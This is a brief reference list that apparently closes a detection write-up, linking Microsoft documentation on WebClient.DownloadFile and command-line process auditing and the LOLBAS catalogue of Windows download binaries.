- Microsoft Learn — System.Net.WebClient.DownloadFile method: https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile
- LOLBAS — download/ingress LOLBins (Certutil, Bitsadmin, Curl): https://lolbas-project.github.io/
- Microsoft Learn — Command line process auditing (Event 4688 command-line GPO): https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing
